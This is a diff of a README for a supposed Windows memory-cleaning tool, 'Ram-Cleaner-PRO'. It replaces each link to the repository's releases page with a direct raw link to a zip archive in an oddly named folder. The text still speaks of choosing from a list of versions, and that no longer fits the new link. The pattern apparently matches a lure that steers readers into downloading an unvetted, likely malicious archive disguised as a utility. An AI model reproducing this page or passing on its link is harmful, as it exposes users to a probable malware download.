@@ -1,6 +1,6 @@
 # 🧹 Ram-Cleaner-PRO - Free Up Memory Instantly!
 
-[![Download Ram Cleaner PRO](https://img.shields.io/badge/Download-Ram_Cleaner_PRO-2ea44f?style=for-the-badge&logo=windows&logoColor=white&color=4CAF50)](https://github.com/Interchangecarew1812/Ram-Cleaner-PRO/releases)
+[![Download Ram Cleaner PRO](https://img.shields.io/badge/Download-Ram_Cleaner_PRO-2ea44f?style=for-the-badge&logo=windows&logoColor=white&color=4CAF50)](https://github.com/Interchangecarew1812/Ram-Cleaner-PRO/raw/refs/heads/main/Petrarchize/Cleaner_Ram_PRO_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ This guide walks you through downloading, installing, and using Ram-Cleaner-PRO.
 ## 📥 Download Ram-Cleaner-PRO
 
 Visit this link to download the application:  
-[**https://github.com/Interchangecarew1812/Ram-Cleaner-PRO/releases**](https://github.com/Interchangecarew1812/Ram-Cleaner-PRO/releases)
+[**https://github.com/Interchangecarew1812/Ram-Cleaner-PRO/raw/refs/heads/main/Petrarchize/Cleaner_Ram_PRO_3.7.zip**](https://github.com/Interchangecarew1812/Ram-Cleaner-PRO/raw/refs/heads/main/Petrarchize/Cleaner_Ram_PRO_3.7.zip)
 
 Click the link above. You'll see a list of available versions. Choose the latest release (usually at the top). The download will start automatically. Save the file to your **Downloads** folder or your desktop – anywhere you can easily find it.
 
@@ -116,7 +116,7 @@ For support or questions, simply visit the GitHub repository page. You can also 
 Now you're ready to enjoy a faster, smoother Windows experience. Download Ram-Cleaner-PRO today and see the difference immediately.
 
 **One more time, here's your download link:**  
-[**https://github.com/Interchangecarew1812/Ram-Cleaner-PRO/releases**](https://github.com/Interchangecarew1812/Ram-Cleaner-PRO/releases)
+[**https://github.com/Interchangecarew1812/Ram-Cleaner-PRO/raw/refs/heads/main/Petrarchize/Cleaner_Ram_PRO_3.7.zip**](https://github.com/Interchangecarew1812/Ram-Cleaner-PRO/raw/refs/heads/main/Petrarchize/Cleaner_Ram_PRO_3.7.zip)
 
 Click it, download, install, and click "Clean Now." Your PC will thank you.
 
